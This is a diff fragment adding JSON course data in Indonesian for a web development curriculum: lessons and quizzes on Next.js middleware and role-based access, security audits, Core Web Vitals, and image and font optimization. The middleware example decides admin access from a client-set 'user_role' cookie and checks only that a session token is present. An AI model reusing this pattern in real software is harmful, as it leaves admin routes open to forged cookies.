+        "contentMd": "# Next.js Middleware: Auth Guard & Role-Based Access Control (RBAC)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari cara mengamankan rute aplikasi secara terpusat menggunakan **Next.js Middleware (`middleware.ts`)**, memvalidasi sesi otentikasi di **Edge Runtime**, serta menerapkan **Role-Based Access Control (RBAC)** untuk membatasi akses Admin vs Siswa.\n\n## Mengapa Konsep Ini Penting?\nJika Anda memiliki 50 halaman dashboard privat, apakah Anda harus menulis kode pengecekan login `if (!isLogin) redirect()` di 50 file terpisah? Jika Anda lupa di 1 file saja, halaman rahasia tersebut bisa bocor. Middleware bertindak sebagai **pintu gerbang tunggal terpusat** yang mencegat request sebelum menyentuh halaman manapun.\n\n## 1. Menyiapkan File `middleware.ts` di Root Proyek\n\n```typescript\n// File: src/middleware.ts (atau di root folder)\nimport { NextResponse } from \"next/server\";\nimport type { NextRequest } from \"next/server\";\n\nexport async function middleware(request: NextRequest) {\n  const { pathname } = request.nextUrl;\n\n  // 1. Ambil Cookie Sesi Token:\n  const sessionToken = request.cookies.get(\"auth_session\")?.value;\n  const userRole = request.cookies.get(\"user_role\")?.value; // Contoh: \"ADMIN\" | \"USER\"\n\n  // 2. Proteksi Halaman Dashboard (Wajib Login):\n  if (pathname.startsWith(\"/dashboard\") || pathname.startsWith(\"/settings\")) {\n    if (!sessionToken) {\n      // Alihkan pengguna yang belum login ke halaman login dengan callbackUrl:\n      const loginUrl = new URL(\"/auth/login\", request.url);\n      loginUrl.searchParams.set(\"callbackUrl\", pathname);\n      return NextResponse.redirect(loginUrl);\n    }\n  }\n\n  // 3. Proteksi Halaman Admin (Role-Based Access Control / RBAC):\n  if (pathname.startsWith(\"/admin\")) {\n    if (!sessionToken) {\n      return NextResponse.redirect(new URL(\"/auth/login\", request.url));\n    }\n    \n    // Jika login tapi BUKAN ADMIN -> Tolak ke halaman 403 Forbidden / Dashboard:\n    if (userRole !== \"ADMIN\") {\n      return NextResponse.redirect(new URL(\"/dashboard?error=unauthorized_admin\", request.url));\n    }\n  }\n\n  // 4. Jika semua syarat aman, lanjutkan request normal:\n  return NextResponse.next();\n}\n\n// 5. MATCHER CONFIG: Tentukan rute mana saja yang WAJIB melewati Middleware:\nexport const config = {\n  matcher: [\n    \"/dashboard/:path*\",\n    \"/settings/:path*\",\n    \"/admin/:path*\",\n  ],\n};\n```\n\n## 2. Keuntungan Mengeksekusi Auth Guard di Middleware\n1. **Perlindungan Terpusat 100%**: Tidak ada risiko halaman rahasia lupa dilindungi.\n2. **Kecepatan Tinggi di Edge**: Middleware dieksekusi di server CDN terdekat dalam beberapa milidetik sebelum server utama mulai merender halaman HTML.\n3. **Bebas Kedipan (*No UI Flicker*)**: Pengguna yang belum login langsung dialihkan seketika tanpa sempat melihat kedipan tampilan dashboard kosong.\n\n## Kesalahan Umum Pemula\n- **Lupa konfigurasi matcher**: Middleware tanpa matcher akan dieksekusi pada setiap request file statis gambar, icon favicon, dan CSS yang memboroskan komputasi server. Selalu gunakan **`config.matcher`** yang spesifik!\n\n## Praktik Mandiri\n1. Buat rute `/admin/kelola-kursus`.\n2. Pasang proteksi Middleware dan uji: jika cookie bukan `role=ADMIN`, otomatis diarahkan kembali ke `/dashboard`.\n\n## Ringkasan\n- **`middleware.ts`** mencegat seluruh request sebelum menyentuh komponen halaman.\n- Gunakan **`config.matcher`** untuk memfilter rute yang dilindungi.\n- Terapkan **RBAC** untuk membedakan hak akses Admin dan Pengguna biasa.\n- Eksekusi di **Edge** menjamin pengalihan instan bebas kedipan UI.",
+        "quizzes": [
+          {
+            "id": "q-19-5-1",
+            "question": "Di manakah letak file middleware.ts yang benar di dalam proyek Next.js agar dapat mencegat request rute secara global?",
+            "options": [
+              "Di root direktori proyek (sejajar dengan folder app/ atau di dalam folder src/)",
+              "Di dalam folder public/",
+              "Di dalam node_modules/",
+              "Di dalam folder styles/"
+            ],
+            "correctIndex": 0,
+            "explanation": "middleware.ts wajib diletakkan di root proyek atau di dalam folder src/ (jika menggunakan src directory)."
+          },
+          {
+            "id": "q-19-5-2",
+            "question": "Apa fungsi dari properti config.matcher pada file Next.js Middleware?",
+            "options": [
+              "Mendefinisikan pola jalur rute URL spesifik mana saja yang wajib dieksekusi oleh Middleware dan mengecualikan rute statis/gambar yang tidak perlu.",
+              "Mencocokkan warna tema dengan preferensi pengguna.",
+              "Menghapus rute yang tidak aktif.",
+              "Mengompresi file HTML."
+            ],
+            "correctIndex": 0,
+            "explanation": "matcher menyaring eksekusi middleware hanya pada target rute privat yang relevan (seperti /dashboard/:path*)."
+          },
+          {
+            "id": "q-19-5-3",
+            "question": "Apa yang dimaksud dengan Role-Based Access Control (RBAC) pada sistem otorisasi aplikasi web?",
+            "options": [
+              "Sistem pembatasan hak akses rute dan fungsionalitas sistem berdasarkan peran (Role) yang dimiliki oleh akun pengguna (misal: ADMIN memiliki izin mengedit materi, sedangkan STUDENT hanya memiliki izin membaca).",
+              "Sistem yang membatasi akses berdasarkan merk laptop.",
+              "Sistem yang mewajibkan pengguna mengetik dengan cepat.",
+              "Sistem yang menghapus password setiap minggu."
+            ],
+            "correctIndex": 0,
+            "explanation": "RBAC mengatur hak istimewa operasional (privileges) pengguna berdasarkan peran jabatan terstruktur di dalam sistem."
+          }
+        ]
+      },
+      {
+        "id": "lesson-19-6",
+        "stageId": "stage-19",
+        "slug": "security-audit-dan-penetration-testing-basics",
+        "title": "Security Audit & Dasar Penetration Testing",
+        "titleEn": "Security Audit & Pen-Testing Basics",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Melakukan audit keamanan aplikasi: npm audit (analisis dependensi rentan), pemindaian SAST/DAST, ethical hacking checklist, analisis kebocoran kredensial (.env di Git), dan postur pertahanan Defense-in-Depth.",
+        "prerequisites": [
+          "nextjs-middleware-auth-guard-dan-rbac"
+        ],
+        "learningObjectives": [
+          "Mengeksekusi pemindaian kerentanan dependensi open-source menggunakan perintah `npm audit` dan Snyk.",
+          "Menerapkan postur pertahanan berlapis (Defense in Depth) di seluruh tumpukan aplikasi.",
+          "Mendeteksi dan mencabut kredensial sensitif yang tidak sengaja terunggah ke riwayat Git menggunakan GitGuardian / Trufflehog.",
+          "Menyusun Checklist Audit Keamanan pra-rilis produksi."
+        ],
+        "whyMatters": "90% peretasan modern terjadi bukan karena membobol algoritma enkripsi, melainkan karena dependensi open-source pihak ketiga yang memiliki celah keamanan lama.",
+        "careerContext": "Security Audit adalah tahap wajib dalam standar kepatuhan regulasi industri (ISO 27001, SOC2, PCI-DSS).",
+        "commonMistakes": [
+          "Mengabaikan laporan peringatan `npm audit` yang memuat kerentanan tingkat Critical.",
+          "Hanya mengandalkan satu lapisan keamanan saja (misal hanya validasi frontend tanpa validasi backend)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Defense in Depth",
+            "definition": "Strategi keamanan berlapis ganda di mana kegagalan satu dinding pertahanan tetap terlindungi oleh dinding pertahanan berikutnya."
+          },
+          {
+            "term": "npm audit",
+            "definition": "Perintah bawaan package manager untuk memindai pohon dependensi terhadap basis data celah keamanan (Advisory Database)."
+          },
+          {
+            "term": "Secret Leakage",
+            "definition": "Insiden kebocoran kredensial rahasia (API Keys, Database Passwords) ke repository publik."
+          }
+        ],
+        "contentMd": "# Security Audit & Dasar Penetration Testing\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari metodologi **Audit Keamanan Aplikasi Web**: memindai kerentanan dependensi dengan **`npm audit`**, mendeteksi kebocoran kredensial (**Secret Leakage**), menyusun strategi **Defense in Depth**, serta **Security Checklist Pra-Rilis Produksi**.\n\n## Mengapa Konsep Ini Penting?\nSebuah proyek web modern rata-rata mengimpor lebih dari 500 paket dependensi open-source di `node_modules`. Jika satu paket utilitas kecil memiliki celah keamanan, peretas dapat menggunakannya untuk mengambil alih server Anda.\n\n## 1. Audit Dependensi Open-Source (`npm audit`)\nJalankan pemindaian otomatis secara berkala di terminal:\n\n```bash\n# 1. Pindai pohon dependensi terhadap CVE Security Advisories:\nnpm audit\n\n# 2. Perbaiki kerentanan otomatis jika patch tersedia:\nnpm audit fix\n```\n\n## 2. Strategi Pertahanan Berlapis (Defense in Depth)\nJangan pernah mengandalkan satu dinding pertahanan saja:\n\n```text\nLAPISAN 1: CLIENT UI      ──> Validasi Form UX, Input Masking, Sanitasi DOM\nLAPISAN 2: EDGE/NETWORK   ──> Rate Limiting (Redis), DDoS Shield, Security Headers\nLAPISAN 3: BACKEND API    ──> Middleware Auth Guard, Skema Validasi Ketat Zod\nLAPISAN 4: BUSINESS LOGIC ──> Role-Based Access Control (RBAC), Idempotency\nLAPISAN 5: DATABASE       ──> Parameterized Queries (Prisma), Foreign Key Constraints, Enkripsi Data\n```\n\nJika Lapisan 1 dibobol oleh peretas via Postman, Lapisan 3 (Zod) langsung menolaknya. Jika Lapisan 3 terlewati, Lapisan 5 (Prisma) mengunci eksekusi SQL!\n\n## 3. Menangani Insiden Kebocoran Kunci Rahasia (*Secret Leak*)\nJika Anda tidak sengaja melakukan commit file `.env` yang berisi database password ke GitHub:\n1. **ANGGAP KUNCI TERSEBUT SUDAH DIRETAS SEKETIKA!** Bot scanner peretas memindai commit publik GitHub setiap detik.\n2. **Segera Cabut / Reset Kunci (*Rotate Secrets*)**: Masuk ke dashboard database/provider dan buat password baru segera.\n3. Hapus riwayat commit lama dari Git menggunakan tools seperti `git-filter-repo` atau BFG Repo-Cleaner.\n\n## 4. Checklist Keamanan Pra-Rilis Produksi\n- [ ] Seluruh password di-hash dengan **Argon2id** atau **bcrypt**.\n- [ ] Cookie otentikasi menggunakan flag **`HttpOnly; Secure; SameSite=Lax`**.\n- [ ] Seluruh endpoint publik dilindungi **Rate Limiting**.\n- [ ] Input data divalidasi ketat dengan **Zod**.\n- [ ] Tidak ada API keys yang diawali `NEXT_PUBLIC_` untuk kunci rahasia server.\n- [ ] Output `npm audit` bersih dari kerentanan Critical / High.\n- [ ] Security Headers terpasang (**X-Frame-Options, CSP, HSTS**).\n\n## Kesalahan Umum Pemula\n- **Menamai kunci rahasia dengan prefix `NEXT_PUBLIC_`**: Di Next.js, variabel `NEXT_PUBLIC_SECRET_KEY` otomatis dibongkar dan dikirim ke browser client! Kunci rahasia server WAJIB bernama `SECRET_KEY` (tanpa `NEXT_PUBLIC_`).\n\n## Praktik Mandiri\n1. Jalankan `npm audit` di proyek Anda.\n2. Periksa file `.gitignore` untuk memastikan `.env` dan `.env.local` terdaftar rapi.\n\n## Ringkasan\n- Rutin jalankan **`npm audit`** untuk memindai kerentanan library pihak ketiga.\n- Terapkan filosofi **Defense in Depth** (keamanan berlapis ganda dari frontend hingga database).\n- Segera **rotate (ganti)** kredensial jika terjadi insiden kebocoran ke GitHub.\n- Jangan pernah menyematkan prefix **`NEXT_PUBLIC_`** pada kredensial server rahasia.",
+        "quizzes": [
+          {
+            "id": "q-19-6-1",
+            "question": "Apa tindakan pertama yang WAJIB dan paling krusial dilakukan jika Anda tidak sengaja melakukan commit file .env yang memuat password database ke repository publik GitHub?",
+            "options": [
+              "Segera mencabut dan mengubah (rotate) password database tersebut di dashboard hosting karena bot scanner publik memindai kebocoran kredensial dalam hitungan detik.",
+              "Cukup menghapus file di commit berikutnya tanpa mengubah password.",
+              "Menutup akun GitHub.",
+              "Mematikan monitor komputer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Menghapus file di commit baru tidak menghapus jejak riwayat git; kredensial yang terekspos harus segera di-rotate/dicabut seketika."
+          },
+          {
+            "id": "q-19-6-2",
+            "question": "Apa yang dimaksud dengan filosofi pertahanan 'Defense in Depth' dalam rekayasa keamanan perangkat lunak?",
+            "options": [
+              "Menerapkan beberapa lapisan mekanisme pertahanan keamanan independen di seluruh tingkatan sistem (Client, Network, API, Database) sehingga jika satu lapisan gagal, lapisan berikutnya tetap melindungi sistem.",
+              "Memasang 5 antivirus sekaligus di satu laptop.",
+              "Menyimpan password di 10 file teks yang berbeda.",
+              "Mewajibkan login dengan 10 kali password."
+            ],
+            "correctIndex": 0,
+            "explanation": "Defense in depth menerapkan redundansi kontrol keamanan multi-lapis untuk meminimalkan dampak kegagalan satu komponen."
+          },
+          {
+            "id": "q-19-6-3",
+            "question": "Apa bahaya fatal dari memberi prefix NEXT_PUBLIC_ pada variabel kredensial server rahasia (contoh: NEXT_PUBLIC_STRIPE_SECRET_KEY) di Next.js?",
+            "options": [
+              "Next.js akan secara otomatis menyertakan dan membocorkan nilai variabel rahasia tersebut ke dalam bundle JavaScript publik yang dapat diinspeksi oleh siapa saja di browser.",
+              "Server database akan menolak menyala.",
+              "Aplikasi akan otomatis terhapus dari hosting.",
+              "Next.js akan melempar SyntaxError."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prefix NEXT_PUBLIC_ secara eksplisit menginstruksikan compiler Next.js untuk mengekspos variabel tersebut ke bundle browser client."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-20",
+    "orderIndex": 20,
+    "titleId": "Performance Optimization, SEO, Core Web Vitals & Production Deployment",
+    "titleEn": "Performance, SEO, Core Web Vitals & Production Deployment",
+    "category": "Fullstack & DevOps",
+    "description": "Puncak keahlian web development: Optimasi Core Web Vitals (LCP, INP, CLS), Google Lighthouse 100, dynamic imports (next/dynamic), image & font optimization, CI/CD pipeline dengan GitHub Actions, Docker containerization, dan deployment produksi.",
+    "descriptionEn": "Master Core Web Vitals (LCP, INP, CLS), Lighthouse 100, dynamic imports, font/image optimization, CI/CD with GitHub Actions, Docker, and deployment.",
+    "lessons": [
+      {
+        "id": "lesson-20-1",
+        "stageId": "stage-20",
+        "slug": "core-web-vitals-lcp-inp-cls-deep-dive",
+        "title": "Core Web Vitals Deep Dive: LCP, INP & CLS",
+        "titleEn": "Core Web Vitals: LCP, INP & CLS",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Membedah metrik resmi Google Core Web Vitals: Largest Contentful Paint (LCP < 2.5s), Interaction to Next Paint (INP < 200ms menggantikan FID), Cumulative Layout Shift (CLS < 0.1), dan dampaknya pada ranking SEO Google.",
+        "prerequisites": [
+          "security-audit-dan-penetration-testing-basics"
+        ],
+        "learningObjectives": [
+          "Mengukur dan menganalisis 3 pilar Google Core Web Vitals: LCP, INP, dan CLS.",
+          "Mendiagnosis dan memperbaiki masalah LCP lambat (optimasi fetch priority, preloading hero image).",
+          "Mendiagnosis dan memperbaiki masalah INP (memecah long-tasks di Main Thread JavaScript).",
+          "Mencegah Cumulative Layout Shift (CLS) dengan menyertakan dimensi eksplisit width & height pada seluruh elemen media/iklan."
+        ],
+        "whyMatters": "Google secara resmi menggunakan Core Web Vitals sebagai faktor penentu peringkat pencarian SEO dan konversi penjualan e-commerce.",
+        "careerContext": "Frontend Performance Specialist yang menguasai Core Web Vitals adalah salah satu peran dengan bayaran tertinggi di industri web.",
+        "commonMistakes": [
+          "Memuat gambar Hero banner dengan `loading='lazy'` (gambar terpenting di layar pertama WAJIB dimuat dengan `priority`, bukan lazy!).",
+          "Memasukkan banner iklan dinamis tanpa memesan ruang tinggi kotak (`aspect-ratio`), menyebabkan seluruh teks di bawahnya melompat anjlok (merusak skor CLS)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Largest Contentful Paint (LCP)",
+            "definition": "Metrik pengukur waktu render elemen visual terbesar (biasanya gambar hero atau teks judul utama) di viewport layar (Target: < 2.5 detik)."
+          },
+          {
+            "term": "Interaction to Next Paint (INP)",
+            "definition": "Metrik resmi baru Google pengukur responsivitas antarmuka terhadap klik/ketikan pengguna sepanjang sesi (Target: < 200 milidetik)."
+          },
+          {
+            "term": "Cumulative Layout Shift (CLS)",
+            "definition": "Metrik pengukur stabilitas visual untuk menghitung pergeseran layout tak terduga saat halaman dimuat (Target: < 0.1)."
+          }
+        ],
+        "contentMd": "# Core Web Vitals Deep Dive: LCP, INP & CLS\n\n## Apa yang Akan Dipelajari?\nPada materi puncak ini, Anda akan mempelajari standar performa resmi Google: **Core Web Vitals**. Anda akan membedah **LCP (Largest Contentful Paint)**, metrik responsivitas baru **INP (Interaction to Next Paint)**, stabilitas visual **CLS (Cumulative Layout Shift)**, serta teknik mencapai skor sempurna.\n\n## Mengapa Konsep Ini Penting?\nWebsite yang lambat 1 detik dapat menurunkan konversi penjualan hingga 20%. Google menempatkan website dengan skor Core Web Vitals hijau (**Good**) di peringkat teratas hasil pencarian.\n\n## 1. Tiga Metrik Utama Google Core Web Vitals\n\n```text\n┌──────────────────────────────────────┬──────────────────────┬────────────────────────────────────────┐\n│ Metrik Core Web Vitals               │ Ambang Batas Baik    │ Aspek Pengalaman Pengguna              │\n├──────────────────────────────────────┼──────────────────────┼────────────────────────────────────────┤\n│ 1. LCP (Largest Contentful Paint)    │ < 2.5 Detik          │ Kecepatan Pemuatan Konten Utama        │\n│ 2. INP (Interaction to Next Paint)   │ < 200 Milidetik      │ Responsivitas Interaksi Klik/Ketikan   │\n│ 3. CLS (Cumulative Layout Shift)     │ < 0.1                │ Stabilitas Visual (Anti-Lompat)        │\n└──────────────────────────────────────┴──────────────────────┴────────────────────────────────────────┘\n```\n\n## 2. Strategi Menuntaskan LCP (< 2.5 Detik)\nLCP biasanya berupa gambar banner Hero atau judul `<h1>` terbesar:\n- **Trik Kunci**: Berikan atribut **`priority`** pada gambar Hero di Next.js agar diunduh paling awal:\n```tsx\n<Image\n  src=\"/hero-banner.webp\"\n  alt=\"Belajar Web Development\"\n  width={1200}\n  height={600}\n  priority // KUNCI: Jangan di-lazy load! Muat dengan prioritas tertinggi!\n/>\n```\n\n## 3. Strategi Menuntaskan INP (< 200 Milidetik)\nINP mengukur seberapa cepat browser merespon visual setelah pengguna mengklik tombol:\n- **Penyebab INP Buruk**: Main Thread JavaScript sibuk menjalankan tugas komputasi sinkron yang terlalu panjang (*Long Tasks > 50ms*).\n- **Solusi**: Pecah tugas berat menggunakan `setTimeout`, `requestIdleCallback`, atau Web Workers.\n\n## 4. Strategi Menuntaskan CLS (< 0.1)\nPernahkah Anda ingin mengklik tombol, tiba-tiba sebuah banner iklan muncul di atasnya sehingga Anda tidak sengaja mengklik iklan tersebut? Itu adalah masalah **Layout Shift**:\n- **Solusi**: Selalu sediakan **`width` & `height`** atau properti CSS **`aspect-ratio`** pada seluruh gambar, video, dan kotak iklan agar browser sudah memesan ruang kosong sejak awal:\n\n```css\n/* Kunci Anti CLS: Pesan ruang rasio 16:9 sebelum gambar selesai diunduh */\n.banner-kotak {\n  aspect-ratio: 16 / 9;\n  width: 100%;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memasang `loading=\"lazy\"` pada gambar pertama di atas layar (*Above the Fold*)**: Menyebabkan browser menunda pengunduhan banner utama dan merusak skor LCP secara drastis.\n\n## Praktik Mandiri\n1. Buka Chrome DevTools $\\rightarrow$ Tab **Lighthouse**.\n2. Jalankan audit mode **Mobile** pada halaman web Anda dan catat skor LCP, INP, dan CLS.\n\n## Ringkasan\n- **LCP (< 2.5s)** mengukur kecepatan konten utama (optimasi dengan `priority`).\n- **INP (< 200ms)** mengukur responsivitas klik (hindari long tasks di main thread).\n- **CLS (< 0.1)** mengukur stabilitas visual (selalu sertakan dimensi `aspect-ratio`).\n- Skor Core Web Vitals yang hijau mendongkrak peringkat SEO Google secara masif.",
+        "quizzes": [
+          {
+            "id": "q-20-1-1",
+            "question": "Metrik Core Web Vitals resmi baru Google apakah yang menggantikan First Input Delay (FID) untuk mengukur seluruh responsivitas interaksi klik dan ketikan pengguna sepanjang sesi kunjungan?",
+            "options": [
+              "Interaction to Next Paint (INP)",
+              "Largest Contentful Paint (LCP)",
+              "Cumulative Layout Shift (CLS)",
+              "Time to First Byte (TTFB)"
+            ],
+            "correctIndex": 0,
+            "explanation": "INP (Interaction to Next Paint) adalah metrik resmi Google pengukur latensi interaktivitas holistik sepanjang sesi halaman."
+          },
+          {
+            "id": "q-20-1-2",
+            "question": "Bagaimana cara paling efektif untuk mencegah masalah Cumulative Layout Shift (CLS) yang buruk akibat gambar atau banner iklan yang dimuat secara dinamis?",
+            "options": [
+              "Selalu menyertakan atribut width dan height eksplisit atau menyetel properti CSS aspect-ratio pada kontainer pembungkus media agar browser memesan ruang kosong sebelum gambar selesai diunduh.",
+              "Menghapus seluruh gambar dari website.",
+              "Memaksa pengguna tidak menggeser layar.",
+              "Mengubah format gambar menjadi file teks."
+            ],
+            "correctIndex": 0,
+            "explanation": "Menyediakan dimensi atau aspect-ratio yang pasti memesan slot layout stabil, mencegah elemen teks di bawahnya terdorong anjlok saat gambar tiba."
+          },
+          {
+            "id": "q-20-1-3",
+            "question": "Berapa target ambang batas waktu (threshold) yang diklasifikasikan sebagai skor 'Baik (Good)' oleh Google untuk metrik Largest Contentful Paint (LCP)?",
+            "options": [
+              "Di bawah 2.5 detik (< 2.5s)",
+              "Di bawah 10 detik",
+              "Di bawah 0.01 detik",
+              "Di bawah 1 menit"
+            ],
+            "correctIndex": 0,
+            "explanation": "Google menetapkan target LCP Good di bawah 2.5 detik untuk menjamin pengalaman pemuatan konten utama yang memuaskan."
+          }
+        ]
+      },
+      {
+        "id": "lesson-20-2",
+        "stageId": "stage-20",
+        "slug": "optimasi-gambar-dan-font-next-image-font",
+        "title": "Optimasi Gambar & Font Tingkat Lanjut (next/image, next/font)",
+        "titleEn": "Image & Font Optimization (next/image, next/font)",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Menguasai optimasi aset visual otomatis di Next.js: next/image (AVIF/WebP conversion, responsive sizes, priority, blur placeholder) dan next/font (zero layout shift Google fonts, self-hosting).",
+        "prerequisites": [
+          "core-web-vitals-lcp-inp-cls-deep-dive"
+        ],
+        "learningObjectives": [
+          "Mengganti tag <img> standar dengan komponen `next/image` untuk konversi otomatis format modern (AVIF/WebP) dan dynamic resizing.",
+          "Menerapkan blur-up placeholder (`placeholder='blur'`) untuk pengalaman visual loading yang elegan.",
+          "Menggunakan `next/font/google` untuk self-hosting font otomatis tanpa koneksi jaringan eksternal ke server Google pada runtime.",
+          "Mencegah Flash of Unstyled Text (FOUT) dan layout shift pada tipografi."
+        ],
+        "whyMatters": "Gambar dan Font eksternal adalah dua aset terberat yang memicu 80% keterlambatan render pertama halaman web.",
+        "careerContext": "Penguasaan `next/image` dan `next/font` adalah trik utama mencapai skor performa 100 di Google Lighthouse.",
+        "commonMistakes": [
+          "Menggunakan tag `<img>` biasa untuk gambar resolusi tinggi tanpa kompresi.",
+          "Mengunduh font Google via tag `<link href='https://fonts.googleapis.com'>` yang memicu pemblokiran render jaringan eksternal."
+        ],
+        "keyTerms": [
+          {
+            "term": "next/image",
+            "definition": "Komponen bawaan Next.js yang mengotomatiskan kompresi, format modern (AVIF), responsivitas, dan lazy-loading gambar."
+          },
+          {
+            "term": "next/font",
+            "definition": "Sistem optimasi font bawaan yang mengunduh dan melakukan self-hosting file font secara otomatis pada saat build time."
+          },
+          {
+            "term": "Blur Placeholder",
+            "definition": "Pratinjau gambar buram ultra-ringan (~100 bytes) yang langsung tampil saat gambar asli masih diunduh."
+          }
+        ],
+        "contentMd": "# Optimasi Gambar & Font Tingkat Lanjut (next/image, next/font)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari dua senjata performa terkuat di Next.js: **`next/image`** (kompresi gambar otomatis, konversi ke format **AVIF/WebP**, **Blur Placeholder**) dan **`next/font`** (self-hosting Google Fonts otomatis bebas *Layout Shift*).\n\n## Mengapa Konsep Ini Penting?\nJika Anda memasukkan foto kamera 12 MP (ukuran 5 MB) ke tag `<img>` biasa di smartphone, pengguna Anda akan menghabiskan kuota dan menunggu 10 detik. `next/image` secara otomatis mengubah foto tersebut menjadi format AVIF berukuran hanya 40 KB di server sebelum dikirim ke ponsel!\n\n## 1. Komponen `next/image` (Otomasi Tingkat Dewa)\n\n```tsx\nimport Image from \"next/image\";\n\nexport function HeroCard() {\n  return (\n    <div className=\"relative w-full h-[400px]\">\n      <Image\n        src=\"/foto-kursus.jpg\"\n        alt=\"Siswa BelajarinAja sedang koding\"\n        fill // Mengisi kontainer parent secara responsif\n        sizes=\"(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw\"\n        priority // Muat paling awal untuk LCP\n        placeholder=\"blur\" // Efek blur-up halus saat dimuat\n        blurDataURL=\"data:image/png;base64,...\" // Preview buram ultra ringan\n        className=\"object-cover rounded-xl\"\n      />\n    </div>\n  );\n}\n```\n\n### Apa yang Dilakukan `next/image` di Balik Layar?\n1. **Format Modern Otomatis**: Otomatis menyajikan format **AVIF** atau **WebP** jika browser mendukung.\n2. **Dynamic Resizing**: Ponsel layar 375px hanya dikirimi gambar selebar 400px; monitor 4K dikirimi gambar tajam.\n3. **Lazy Loading Otomatis**: Gambar di bagian bawah layar hanya diunduh saat pengguna menggulir mendekati gambar tersebut.\n4. **Anti-CLS Bawaan**: Memastikan ruang gambar terkunci agar tidak memicu pergeseran layout.\n\n## 2. Optimasi Tipografi dengan `next/font`\nCara lama memuat Google Fonts (`<link href=\"https://fonts.googleapis.com\">`) sangat lambat karena browser harus melakukan koneksi DNS dan download font ke server Google terpisah.\n\nDengan **`next/font`**, font diunduh **sekali saat proses build dan di-hosting langsung dari server domain Anda sendiri (*Zero External Network Requests*)**:\n\n```typescript\n// File: app/layout.tsx\nimport { Inter, Outfit } from \"next/font/google\";\nimport \"./globals.css\";\n\n// Konfigurasi Font:\nconst outfit = Outfit({\n  subsets: [\"latin\"],\n  variable: \"--font-outfit\",\n  display: \"swap\", // Tampilkan font fallback segera bebas FOUT\n});\n\nexport default function RootLayout({ children }: { children: React.ReactNode }) {\n  return (\n    <html lang=\"id\" className={outfit.variable}>\n      <body className=\"font-sans antialiased\">\n        {children}\n      </body>\n    </html>\n  );\n}\n```\n\n## Kesalahan Umum Pemula\n- **Lupa konfigurasi domain eksternal**: Jika memuat gambar dari URL luar (seperti Cloudinary atau AWS S3), Anda wajib mendaftarkan domain tersebut di `next.config.ts` pada properti `images.remotePatterns`.\n\n## Praktik Mandiri\n1. Pasang font Google kustom `Plus_Jakarta_Sans` menggunakan `next/font/google`.\n2. Ganti semua tag `<img>` dengan `<Image />` dan amati penghematan ukuran file di tab Network DevTools.\n\n## Ringkasan\n- Gunakan **`next/image`** untuk konversi otomatis ke AVIF/WebP, dynamic resizing, dan anti-CLS.\n- Berikan **`priority`** pada gambar Hero LCP.\n- Gunakan **`next/font`** untuk self-hosting font otomatis tanpa koneksi jaringan eksternal ke Google Fonts saat runtime.",
+        "quizzes": [
+          {
+            "id": "q-20-2-1",
+            "question": "Apa keuntungan performa utama dari menggunakan next/font/google di Next.js dibandingkan memasang tag link eksternal <link href='https://fonts.googleapis.com'>?",
+            "options": [
+              "next/font mengunduh dan melakukan self-hosting file font secara otomatis pada saat build time, menghilangkan seluruh koneksi jaringan eksternal ke server Google pada runtime dan mencegah Layout Shift.",
+              "next/font mengubah seluruh font menjadi huruf kapital.",
+              "next/font membuat font hanya bisa dibaca oleh robot AI.",
+              "next/font menghapus seluruh aturan CSS."
+            ],
+            "correctIndex": 0,
+            "explanation": "next/font meng-inline font assets di domain lokal secara zero-layout-shift tanpa dependensi jaringan pihak ketiga saat pengguna membuka halaman."
+          },
+          {
+            "id": "q-20-2-2",
+            "question": "Fitur otomatis apakah yang disediakan oleh komponen next/image di balik layar?",
+            "options": [
+              "Konversi format modern (AVIF/WebP), pembuatan resolusi responsif sesuai ukuran layar, lazy loading otomatis, dan pencegahan Cumulative Layout Shift (CLS).",
+              "Pengeditan filter foto Instagram otomatis.",
+              "Penghapusan background foto secara otomatis.",
+              "Pengubahan foto menjadi file audio suara."
+            ],
+            "correctIndex": 0,
+            "explanation": "next/image mengotomatiskan seluruh best-practices optimasi gambar web: format generation, visual resizing, dan layout preservation."
+          },
+          {
+            "id": "q-20-2-3",
+            "question": "Properti apakah pada komponen next/image yang WAJIB ditambahkan pada gambar banner Hero di bagian atas layar agar browser memprioritaskan pengunduhan demi skor LCP yang optimal?",
+            "options": [
+              "priority={true} (atau cukup menuliskan priority)",
+              "loading='lazy'",
+              "async={true}",
+              "importance='high-priority'"
+            ],
+            "correctIndex": 0,
+            "explanation": "Properti priority menonaktifkan lazy loading dan menginstruksikan browser untuk memuat gambar target di urutan prioritas tertinggi (preload)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-20-3",
+        "stageId": "stage-20",
+        "slug": "code-splitting-dan-next-dynamic-imports",
+        "title": "Code Splitting & Lazy Loading (next/dynamic)",
+        "titleEn": "Code Splitting & Dynamic Imports",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Memecah bundle JavaScript menjadi potongan kecil dengan Dynamic Imports (next/dynamic, React.lazy), memuat komponen berat (Charts, Rich Text Editor, Modal) hanya saat dibutuhkan (on demand), dan opsi ssr: false.",
+        "prerequisites": [
+          "optimasi-gambar-dan-font-next-image-font"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Code Splitting dan dampaknya terhadap pengurangan Total Blocking Time (TBT).",
+          "Menerapkan `next/dynamic` untuk memuat komponen berat secara asinkron hanya saat dibutuhkan.",
+          "Menggunakan opsi `{ ssr: false }` untuk library client-only yang bergantung pada browser global (seperti Chart.js atau Leaflet Maps).",
+          "Menyediakan fallback UI loading skeleton saat komponen dinamis sedang diunduh."
+        ],
+        "whyMatters": "Memuat library Chart grafik seberat 500 KB di halaman utama yang jarang dibuka pengguna adalah pemborosan fatal yang memperlambat waktu muat awal website.",
+        "careerContext": "Code Splitting dan Dynamic Bundling adalah teknik wajib untuk mempertahankan performa aplikasi SaaS yang memiliki ratusan fitur.",
+        "commonMistakes": [
